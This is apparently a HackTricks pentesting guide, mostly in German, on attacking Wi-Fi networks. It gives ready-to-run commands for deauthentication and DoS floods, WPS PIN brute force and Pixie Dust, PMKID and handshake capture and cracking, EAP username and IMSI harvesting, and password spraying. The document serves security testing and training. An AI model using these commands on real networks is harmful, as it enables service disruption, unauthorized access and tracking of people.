# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Wifi Grundlegende Befehle
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Werkzeuge

### Hijacker & NexMon (Android internal Wi-Fi)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**airgeddon mit docker ausführen**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
Von: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Es kann Evil Twin-, KARMA- und Known Beacons-Angriffe durchführen und anschließend eine phishing-Vorlage verwenden, um das echte Passwort des Netzwerks zu erlangen oder Zugangsdaten sozialer Netzwerke abzufangen.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Dieses Tool automatisiert **WPS/WEP/WPA-PSK**-Angriffe. Es wird automatisch:

- Das Interface in den Monitor-Modus setzen
- Nach möglichen Netzwerken scannen - und dir erlauben, das/die Ziel(e) auszuwählen
- Bei WEP - WEP-Angriffe starten
- Bei WPA-PSK
- Bei WPS: Pixie dust attack und bruteforce attack (Achtung: der bruteforce-Angriff kann lange dauern). Beachte, dass keine null PINs oder datenbank-/generierten PINs ausprobiert werden.
- Versucht, das PMKID vom AP zu erfassen, um es zu cracken
- Versucht, Clients des AP zu deauthentifizieren, um einen Handshake zu erfassen
- Bei PMKID oder Handshake, versucht es, mit top5000-Passwörtern zu bruteforcen.

## Angriffsübersicht

- **DoS**
- Deauthentication/disassociation -- Alle trennen (oder eine spezifische ESSID/Client)
- Random fake APs -- Netze verbergen, Scanner zum Absturz bringen
- Overload AP -- Versuch, den AP zu killen (meist nicht sehr nützlich)
- WIDS -- Mit dem IDS spielen
- TKIP, EAPOL -- Einige spezifische Angriffe, um einige APs zu DoS-en
- **Cracking**
- Crack **WEP** (verschiedene Tools und Methoden)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** capture + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (with or without DoS)
- **Open** Evil Twin \[+ DoS] -- Nützlich, um captive portal creds zu erfassen und/oder LAN-Angriffe durchzuführen
- **WPA-PSK** Evil Twin -- Nützlich für Netzwerkangriffe, wenn du das Passwort kennst
- **WPA-MGT** -- Nützlich, um Firmen-Credentials zu erfassen
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- Nützlich, um captive portal creds zu erfassen und/oder LAN-Angriffe durchzuführen
- **+ WPA** -- Nützlich, um WPA handshakes zu erfassen

## DOS

### Deauthentication Packets

**Beschreibung von** [**here**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deauthentication**-Angriffe, eine weit verbreitete Methode im Wi-Fi-Hacking, beinhalten das Fälschen von "management" frames, um Geräte gezielt von einem Netzwerk zu **trennen**. Diese unverschlüsselten Pakete täuschen Clients, dass sie vom legitimen Netzwerk stammen, und ermöglichen Angreifern, WPA handshakes zum Cracking zu sammeln oder dauerhaft Netzwerkverbindungen zu stören. Diese Taktik ist beunruhigend simpel, wird häufig verwendet und hat weitreichende Folgen für die Netzwerksicherheit.

**Deauthentication using Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0 bedeutet deauthentication
- 1 ist die Anzahl der zu sendenden deauths (man kann mehrere senden, wenn gewünscht); 0 bedeutet, sie kontinuierlich zu senden
- -a 00:14:6C:7E:40:80 ist die MAC-Adresse des Access Points
- -c 00:0F:B5:34:30:30 ist die MAC-Adresse des Clients, der deauthenticate werden soll; wenn dies weggelassen wird, wird eine Broadcast-deauthentication gesendet (funktioniert nicht immer)
- ath0 ist der Schnittstellenname

### Disassociation Packets

**Disassociation packets**, ähnlich wie deauthentication packets, sind eine Art Management-Frame, der in Wi-Fi-Netzwerken verwendet wird. Diese Pakete dienen dazu, die Verbindung zwischen einem Gerät (z. B. einem Laptop oder Smartphone) und einem Access Point (AP) zu trennen. Der wesentliche Unterschied zwischen disassociation und deauthentication liegt in ihren Einsatzszenarien. **Während ein AP deauthentication packets sendet, um rogue devices explizit aus dem Netzwerk zu entfernen, werden disassociation packets typischerweise gesendet, wenn sich der AP herunterfährt**, neu startet oder umzieht, wodurch die Trennung aller verbundenen Knoten erforderlich wird.

**Dieser Angriff kann mit mdk4(mode "d") durchgeführt werden:**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Weitere DOS-Angriffe durch mdk4**

**Siehe** [**here**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

Sendet beacon frames, um Clients gefälschte APs anzuzeigen. Das kann manchmal network scanners und sogar drivers zum Absturz bringen!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

Das Senden von authentication frames an alle erreichbaren Access Points (APs) in Reichweite kann diese APs, besonders bei vielen Clients, überlasten. Dieser intensive Traffic kann zu Systeminstabilität führen, wodurch einige APs einfrieren oder sogar neu starten/resetten können.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ATTACK MODE p: SSID Probing and Bruteforcing**

Probing Access Points (APs) prüft, ob eine SSID korrekt angezeigt wird und bestätigt die Reichweite des APs. Diese Technik, gekoppelt mit **bruteforcing hidden SSIDs** mit oder ohne wordlist, hilft, versteckte Netzwerke zu identifizieren und zu betreten.

**ATTACK MODE m: Michael Countermeasures Exploitation**

Das Senden zufälliger oder doppelter packets an verschiedene QoS queues kann Michael Countermeasures auf **TKIP APs** auslösen und zu einer einminütigen Abschaltung des APs führen. Diese Methode ist eine effiziente **DoS** (Denial of Service) Angriffstaktik.
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ATTACK MODE e: EAPOL Start and Logoff Packet Injection**

Das Fluten eines AP mit **EAPOL Start frames** erzeugt **fake sessions**, überlastet den AP und blockiert legitime clients. Alternativ erzwingt das Injizieren von **fake EAPOL Logoff messages** die Trennung von clients; beide Methoden stören effektiv den Netzwerkdienst.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: Angriffe gegen IEEE 802.11s Mesh-Netzwerke**

Verschiedene Angriffe auf Link-Management und Routing in Mesh-Netzwerken.

**ATTACK MODE w: WIDS-Verwirrung**

Cross-connecting von Clients zu mehreren WDS-Knoten oder gefälschten rogue APs kann Intrusion Detection and Prevention Systems manipulieren, Verwirrung stiften und potenziellen Systemmissbrauch ermöglichen.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ATTACK MODE f: Packet Fuzzer**

Ein packet fuzzer mit diversen Paketquellen und einem umfassenden Satz von Modifikatoren zur Paketmanipulation.

### **Airggedon**

_**Airgeddon**_ bietet die meisten der in den vorherigen Kommentaren vorgeschlagenen Angriffe:

![](<../../images/image (95).png>)

## WPS

WPS (Wi‑Fi Protected Setup) vereinfacht den Vorgang, Geräte mit einem Router zu verbinden, und beschleunigt sowie vereinfacht die Einrichtung für Netzwerke, die mit **WPA** oder **WPA2** Personal verschlüsselt sind. Es ist für die leicht zu kompromittierende WEP-Sicherheit nicht wirksam. WPS verwendet eine 8-stellige PIN, die in zwei Hälften validiert wird, wodurch sie aufgrund der begrenzten Anzahl an Kombinationen (11.000 Möglichkeiten) anfällig für brute-force attacks ist.

### WPS Bruteforce

Es gibt 2 Haupttools, um diese Aktion durchzuführen: Reaver und Bully.

- **Reaver** wurde entwickelt, um einen robusten und praxisgerechten Angriff gegen WPS darzustellen und wurde gegen eine große Vielfalt von Access Points und WPS-Implementierungen getestet.
- **Bully** ist eine **neue Implementierung** des WPS brute force attack, geschrieben in C. Es hat mehrere Vorteile gegenüber dem originalen reaver-Code: weniger Abhängigkeiten, verbesserte Speicher- und CPU-Leistung, korrekte Behandlung von endianness und ein robusteres Optionsset.

Der Angriff nutzt die Schwachstelle des **WPS PIN's vulnerability** aus, insbesondere die Offenlegung der ersten vier Ziffern und die Rolle der letzten Ziffer als Prüfsumme, was den brute-force attack erleichtert. Verteidigungen gegen brute-force attacks, wie das **blocking MAC addresses** aggressiver Angreifer, erfordern jedoch **MAC address rotation**, um den Angriff fortzusetzen.

Nach Erlangen der WPS PIN mit Tools wie Bully oder Reaver kann der Angreifer den WPA/WPA2 PSK ableiten und so **persistent network access** erlangen.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

Dieser verfeinerte Ansatz zielt auf WPS PINs ab und nutzt bekannte Schwachstellen:

1. **Pre-discovered PINs**: Nutzen Sie eine Datenbank mit bekannten PINs, die bestimmten Herstellern zugeordnet sind, die einheitliche WPS PINs verwenden. Diese Datenbank korreliert die ersten drei Oktette von MAC-addresses mit wahrscheinlichen PINs für diese Hersteller.
2. **PIN Generation Algorithms**: Verwenden Sie Algorithmen wie ComputePIN und EasyBox, die WPS PINs basierend auf der MAC-address des AP berechnen. Der Arcadyan-Algorithmus benötigt zusätzlich eine device ID, wodurch eine weitere Ebene im PIN-Generierungsprozess entsteht.

### WPS Pixie Dust attack

**Dominique Bongard** entdeckte eine Schwachstelle in einigen Access Points (APs) bezüglich der Erstellung geheimer Codes, bekannt als **nonces** (**E-S1** und **E-S2**). Können diese nonces ermittelt werden, wird das Knacken des WPS PIN des APs einfach. Der AP offenbart den PIN innerhalb eines speziellen Codes (hash), um zu beweisen, dass er legitim und kein rogue AP ist. Diese nonces sind im Grunde die "Schlüssel", um den "Tresor" zu öffnen, der den WPS PIN enthält. Mehr dazu findet sich [hier](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>).

Einfach gesagt besteht das Problem darin, dass einige APs nicht zufällig genug Schlüssel zur Verschlüsselung des PIN während des Verbindungsprozesses verwendeten. Dadurch ist der PIN anfällig dafür, von außerhalb des Netzwerks erraten zu werden (offline brute force attack).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Wenn du das Gerät nicht in monitor mode versetzen möchtest oder `reaver` und `bully` Probleme haben, kannst du [OneShot-C](https://github.com/nikita-yfh/OneShot-C) ausprobieren. Dieses Tool kann eine Pixie Dust attack durchführen, ohne in monitor mode wechseln zu müssen.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

Einige schlecht entworfene Systeme erlauben sogar, dass ein **Null PIN** (eine leere oder nicht vorhandene PIN) Zugriff gewährt, was ziemlich ungewöhnlich ist. Das Tool **Reaver** kann diese Sicherheitslücke testen, im Gegensatz zu **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

All the proposed WPS attacks can be easily performed using _**airgeddon.**_

![](<../../images/image (219).png>)

- 5 and 6 lets you try **deinen eigenen PIN** (falls vorhanden)
- 7 and 8 perform the **Pixie Dust attack**
- 13 allows you to test the **NULL PIN**
- 11 and 12 werden **die PINs, die mit dem ausgewählten AP in verfügbaren Datenbanken verknüpft sind, zusammentragen** und **mögliche PINs generieren** mit: ComputePIN, EasyBox und optional Arcadyan (empfohlen, warum nicht?)
- 9 and 10 will test **alle möglichen PINs**

## **WEP**

So broken and unused nowdays. Just know that _**airgeddon**_ have a WEP option called "All-in-One" to attack this kind of protection. More tools offer similar options.

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

In 2018, **hashcat** [revealed](https://hashcat.net/forum/thread-7717.html) a new attack method, unique because it only needs **one single packet** and doesn't require any clients to be connected to the target AP—just interaction between the attacker and the AP.

Many modern routers add an **optional field** to the **first EAPOL** frame during association, known as `Robust Security Network`. This includes the `PMKID`.

As the original post explains, the **PMKID** is created using known data:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Da der "PMK Name" konstant ist, die BSSID des AP und die Station bekannt sind und der `PMK` identisch mit dem aus einem vollständigen 4-way handshake ist, kann **hashcat** diese Informationen nutzen, um den PSK zu knacken und die passphrase wiederherzustellen!

Um diese Informationen zu **sammeln** und das Passwort lokal per **bruteforce** zu knacken, kannst du Folgendes tun:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Die **PMKIDs captured** werden in der **Konsole** angezeigt und außerdem **gespeichert** in \_ **/tmp/attack.pcap**\_\
Konvertiere nun die Aufnahme in das **hashcat/john**-Format und knacke sie:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Bitte beachten Sie, dass das Format eines korrekten Hashes **4 Teile** enthält, z. B.: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` Wenn er **nur** **3 Teile** enthält, ist er **ungültig** (der PMKID capture war nicht gültig).

Bitte beachten Sie, dass `hcxdumptool` **auch handshakes erfasst** (so etwas wird erscheinen: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Sie können die handshakes mit `cap2hccapx` in das hashcat/john-Format umwandeln.
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_Mir ist aufgefallen, dass einige handshakes, die mit diesem Tool erfasst wurden, selbst bei bekanntem korrektem Passwort nicht cracked werden konnten. Ich empfehle, handshakes wenn möglich zusätzlich auf traditionelle Weise zu erfassen oder mehrere davon mit diesem Tool zu sammeln._

### Handshake capture

Ein Angriff auf **WPA/WPA2**-Netzwerke kann durchgeführt werden, indem ein **handshake** erfasst und versucht wird, das Passwort **offline** zu **crack**en. Dieser Prozess beinhaltet das Überwachen der Kommunikation eines bestimmten Netzwerks und der **BSSID** auf einem bestimmten **channel**. Hier eine vereinfachte Anleitung:

1. Identifiziere die **BSSID**, den **channel**, und einen **connected client** des Zielnetzwerks.
2. Verwende `airodump-ng`, um den Netzwerkverkehr auf dem angegebenen **channel** und der **BSSID** zu überwachen, in der Hoffnung, einen **handshake** zu erfassen. Der Befehl sieht ungefähr so aus:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
Um die Chance zu erhöhen, einen handshake zu erfassen, trennen Sie den client kurzzeitig vom Netzwerk, um eine re-authentication zu erzwingen. Dies kann mit dem Befehl `aireplay-ng` gemacht werden, der deauthentication packets an den client sendet:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Beachte, dass der Client, da er deauthenticated wurde, versuchen könnte, sich mit einem anderen AP oder — in anderen Fällen — mit einem anderen Netzwerk zu verbinden._

Sobald in `airodump-ng` einige handshake-Informationen erscheinen, bedeutet das, dass der handshake erfasst wurde und du mit dem Abhören aufhören kannst:

![](<../../images/image (172) (1).png>)

Sobald der handshake erfasst wurde, kannst du ihn mit `aircrack-ng` **crack**:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Prüfen, ob ein Handshake in der Datei enthalten ist

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Wenn dieses Tool einen nicht abgeschlossenen handshake einer ESSID vor dem abgeschlossenen findet, erkennt es den gültigen nicht._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

In **Enterprise-WiFi-Setups wirst du auf verschiedene Authentifizierungsverfahren stoßen**, die jeweils unterschiedliche Sicherheitsstufen und Management-Funktionen bieten. Wenn du Tools wie `airodump-ng` verwendest, um den Netzwerkverkehr zu inspizieren, kannst du Bezeichner für diese Authentifizierungstypen bemerken. Einige gängige Methoden sind:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- Diese Methode unterstützt Hardware-Token und Einmalpasswörter innerhalb von EAP-PEAP. Im Gegensatz zu MSCHAPv2 verwendet sie keine peer challenge und sendet Passwörter im plaintext an den access point, was ein Risiko für downgrade attacks darstellt.
2. **EAP-MD5 (Message Digest 5)**:
- Beinhaltet das Senden des MD5-Hashes des Passworts vom Client. Es wird **nicht empfohlen**, da es anfällig für Wörterbuchangriffe ist, keine Server-Authentifizierung bietet und nicht in der Lage ist, sessionspezifische WEP-Schlüssel zu erzeugen.
3. **EAP-TLS (Transport Layer Security)**:
- Verwendet sowohl client- als auch serverseitige Zertifikate zur Authentifizierung und kann dynamisch benutzer- und sitzungsbasierte WEP-Schlüssel zur Sicherung der Kommunikation erzeugen.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- Bietet gegenseitige Authentifizierung über einen verschlüsselten Tunnel sowie eine Methode zur Ableitung dynamischer, pro Benutzer und pro Sitzung gültiger WEP-Schlüssel. Es benötigt nur serverseitige Zertifikate; Clients verwenden Anmeldeinformationen.
5. **PEAP (Protected Extensible Authentication Protocol)**:
- Funktioniert ähnlich wie EAP, indem ein TLS-Tunnel für geschützte Kommunikation erstellt wird. Dadurch können auch schwächere Authentifizierungsprotokolle oberhalb von EAP verwendet werden, weil der Tunnel Schutz bietet.
- **PEAP-MSCHAPv2**: Oft einfach als PEAP bezeichnet, kombiniert es den verwundbaren MSCHAPv2 Challenge/Response-Mechanismus mit einem schützenden TLS-Tunnel.
- **PEAP-EAP-TLS (or PEAP-TLS)**: Ähnlich zu EAP-TLS, aber es wird zuerst ein TLS-Tunnel aufgebaut, bevor Zertifikate ausgetauscht werden, was eine zusätzliche Sicherheitsschicht bietet.

You can find more information about these authentication methods [here ](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol)and [here](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Username Capture

Beim Lesen von [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) sieht es so aus, dass wenn man **EAP** verwendet, die **"Identity"** **messages** unterstützt werden müssen, und der **username** im **clear** in den **"Response Identity"**-Nachrichten gesendet wird.

Selbst bei Verwendung eines der sichersten Authentifizierungsverfahren: **PEAP-EAP-TLS**, ist es möglich, den im EAP-Protokoll gesendeten Benutzernamen zu **capture**. Dazu muss eine Authentifizierungs-Kommunikation aufgezeichnet werden (starte `airodump-ng` auf einem Kanal und `wireshark` im selben Interface) und filtere die Pakete nach `eapol`.\
Innerhalb des "**Response, Identity**"-Pakets erscheint der **username** des Clients.

![](<../../images/image (850).png>)

### Anonymous Identities

Identity-Hiding wird sowohl von EAP-PEAP als auch von EAP-TTLS unterstützt. Im Kontext eines WiFi-Netzwerks wird eine EAP-Identity-Anfrage typischerweise vom access point (AP) während des Association-Prozesses initiiert. Um die Anonymität der Benutzer zu schützen, enthält die Antwort des EAP-Clients auf dem Gerät des Benutzers nur die unbedingt erforderlichen Informationen, die der initiale RADIUS-Server zur Verarbeitung der Anfrage benötigt. Dieses Konzept lässt sich durch die folgenden Szenarien veranschaulichen:

- EAP-Identity = anonymous
- In diesem Szenario verwenden alle Benutzer den pseudonymen Identifikator "anonymous". Der initiale RADIUS-Server fungiert entweder als EAP-PEAP- oder EAP-TTLS-Server und ist für die serverseitige Handhabung des PEAP- bzw. TTLS-Protokolls verantwortlich. Die innere (geschützte) Authentifizierungsmethode wird dann entweder lokal durchgeführt oder an einen entfernten (home) RADIUS-Server delegiert.
- EAP-Identity = anonymous@realm_x
- In diesem Fall verbergen Benutzer aus verschiedenen Realms ihre Identität, geben jedoch ihre jeweiligen Realms an. Dadurch kann der initiale RADIUS-Server die EAP-PEAP- oder EAP-TTLS-Anfragen an RADIUS-Server in ihren Home-Realms proxyen, die als PEAP- oder TTLS-Server fungieren. Der initiale RADIUS-Server arbeitet dabei ausschließlich als RADIUS-Relay-Node.
- Alternativ kann der initiale RADIUS-Server auch als EAP-PEAP- oder EAP-TTLS-Server fungieren und entweder die geschützte Authentifizierungsmethode selbst behandeln oder an einen anderen Server weiterleiten. Diese Option ermöglicht die Konfiguration unterschiedlicher Policies für verschiedene Realms.

Bei EAP-PEAP, sobald der TLS-Tunnel zwischen dem PEAP-Server und dem PEAP-Client etabliert ist, initiiert der PEAP-Server eine EAP-Identity-Anfrage und überträgt diese durch den TLS-Tunnel. Der Client antwortet auf diese zweite EAP-Identity-Anfrage, indem er eine EAP-Identity-Antwort mit der echten Identität des Benutzers durch den verschlüsselten Tunnel sendet. Dieser Ansatz verhindert effektiv, dass die echte Identität des Benutzers von jemandem, der den 802.11-Verkehr abhört, offengelegt wird.

EAP-TTLS folgt einem leicht anderen Verfahren. Bei EAP-TTLS authentifiziert sich der Client typischerweise mit PAP oder CHAP, abgesichert durch den TLS-Tunnel. In diesem Fall fügt der Client ein User-Name-Attribut und entweder ein Password- oder CHAP-Password-Attribut in die initiale TLS-Nachricht ein, die nach der Tunnel-Etablierung gesendet wird.

Unabhängig vom gewählten Protokoll erhält der PEAP/TTLS-Server Kenntnis über die echte Identität des Benutzers, nachdem der TLS-Tunnel etabliert wurde. Die echte Identität kann als user@realm oder einfach user dargestellt werden. Wenn der PEAP/TTLS-Server auch für die Authentifizierung des Benutzers verantwortlich ist, besitzt er nun die Benutzeridentität und fährt mit der durch den TLS-Tunnel geschützten Authentifizierungsmethode fort. Alternativ kann der PEAP/TTLS-Server eine neue RADIUS-Anfrage an den Home-RADIUS-Server des Benutzers weiterleiten. Diese neue RADIUS-Anfrage lässt die PEAP- oder TTLS-Protokollschicht weg. Wenn die geschützte Authentifizierungsmethode EAP ist, werden die inneren EAP-Nachrichten an den Home-RADIUS-Server ohne die EAP-PEAP- oder EAP-TTLS-Hülle übermittelt. Das User-Name-Attribut der ausgehenden RADIUS-Nachricht enthält die echte Identität des Benutzers und ersetzt den anonymen User-Name aus der eingehenden RADIUS-Anfrage. Wenn die geschützte Authentifizierungsmethode PAP oder CHAP ist (nur von TTLS unterstützt), werden der User-Name und andere aus der TLS-Payload extrahierte Authentifizierungsattribute in der ausgehenden RADIUS-Nachricht eingesetzt und ersetzen so den anonymen User-Name und die TTLS EAP-Message-Attribute der eingehenden RADIUS-Anfrage.

For more info check [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm)

### SIM-based EAP (EAP-SIM/EAP-AKA) identity leakage (IMSI exposure)

SIM-basierte Wi‑Fi-Authentifizierung mit EAP‑SIM/EAP‑AKA über 802.1X kann die permanente Teilnehmerkennung (IMSI) im Klartext während der unauthentifizierten Identity-Phase leak, wenn die Deployment keine Pseudonyme/protected identities oder keinen TLS-Tunnel um das innere EAP implementiert.

Where the leak happens (high level):
- 802.11 association completes to the SSID (often carrier offload SSIDs like FreeWifi_secure, eduroam-like operator realms, etc.).
- Authenticator sends EAP-Request/Identity.
- Vulnerable clients answer EAP-Response/Identity with their permanent identity = IMSI encoded as a 3GPP NAI, prior to any protection.
- Example NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- Anyone passively listening to RF can read that frame. No 4-way handshake or TLS keying is needed.

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>Zum Erweitern klicken</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

Hinweise:
- Funktioniert bevor ein TLS‑Tunnel aufgebaut ist, wenn die Infrastruktur reines EAP‑SIM/AKA ohne geschützte Identitäten/Pseudonyme verwendet.
- Der offenbare Wert ist ein permanenter Identifikator, der an die SIM des Teilnehmers gebunden ist; das Sammeln ermöglicht langfristiges Tracking und nachgelagerte Missbräuche im Telekom‑Bereich.

Auswirkungen
- Privatsphäre: persistentes Tracking von Nutzer*innen/Geräten durch passive Wi‑Fi‑Aufzeichnungen an öffentlichen Orten.
- Grundlage für Telekom‑Missbrauch: Mit der IMSI kann ein Angreifer mit SS7/Diameter‑Zugriff Standortabfragen durchführen oder versuchen, Anrufe/SMS abzufangen und MFA zu stehlen.

Gegenmaßnahmen / worauf zu achten ist
- Überprüfen Sie, dass Clients anonyme äußere Identitäten (Pseudonyme) für EAP‑SIM/AKA gemäß 3GPP‑Richtlinien (z. B. 3GPP TS 33.402) verwenden.
- Bevorzugen Sie das Tunneln der Identitätsphase (z. B. EAP‑TTLS/PEAP mit innerem EAP‑SIM/AKA), sodass die IMSI niemals im Klartext gesendet wird.
- Packet‑Captures der Association/Auth sollten niemals eine rohe IMSI in EAP-Response/Identity zeigen.

Verwandt: Ausnutzung von Telekom‑Signalisierung mit erfassten Mobil‑Identifikatoren
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

Wenn vom Client erwartet wird, einen **Benutzernamen und ein Passwort** zu verwenden (beachte, dass **EAP-TLS in diesem Fall nicht gültig ist**), kannst du versuchen, eine **Liste** von **Benutzernamen** (siehe nächsten Abschnitt) und **Passwörtern** zu beschaffen und den Zugriff mit [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Sie könnten diesen Angriff auch mit `eaphammer` durchführen:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Client-Angriffe — Theorie

### Netzwerkwahl und Roaming

- Das 802.11-Protokoll definiert, wie eine Station einem Extended Service Set (ESS) beitritt, bestimmt aber nicht die Kriterien zur Auswahl eines ESS oder eines access point (AP) innerhalb desselben.
- Stationen können zwischen APs mit derselben ESSID roamen und so die Konnektivität über ein Gebäude oder Gebiet hinweg aufrechterhalten.
- Das Protokoll verlangt die Authentifizierung der Station am ESS, schreibt aber nicht vor, dass der AP sich gegenüber der Station authentifiziert.

### Preferred Network Lists (PNLs)

